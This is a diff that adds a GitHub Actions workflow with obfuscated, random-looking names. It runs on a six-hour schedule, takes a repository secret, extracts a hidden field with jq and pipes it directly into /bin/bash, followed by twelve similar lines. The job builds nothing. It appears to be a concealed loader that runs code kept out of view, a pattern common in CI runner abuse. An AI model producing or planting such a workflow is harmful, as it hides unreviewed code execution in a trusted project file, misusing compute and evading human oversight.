@@ -1,0 +1,28 @@
+name: guobaoliu5647
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guobaoliu5647
+        env:
+          azwp90: ${{ secrets.azwp90 }}
+        run: |
+          echo $azwp90 | jq -r .pb45697 | /bin/bash
+          echo $lp01842 | jq -r .gcs3107 | /bin/bash
+          echo $svq30 | jq -r .ziyac920 | /bin/bash
+          echo $zhue10099 | jq -r .p23 | /bin/bash
+          echo $dq768 | jq -r .fv40154 | /bin/bash
+          echo $xvder49457 | jq -r .kdms76303 | /bin/bash
+          echo $rk2576 | jq -r .ygqem21 | /bin/bash
+          echo $s6 | jq -r .iom08424 | /bin/bash
+          echo $ckdft4731 | jq -r .i22 | /bin/bash
+          echo $bewf587 | jq -r .gf5764 | /bin/bash
+          echo $zusdk4421 | jq -r .kmuce3891 | /bin/bash
+          echo $lx0 | jq -r .kzo064 | /bin/bash
+          echo $pbcu0 | jq -r .xl39 | /bin/bash
+
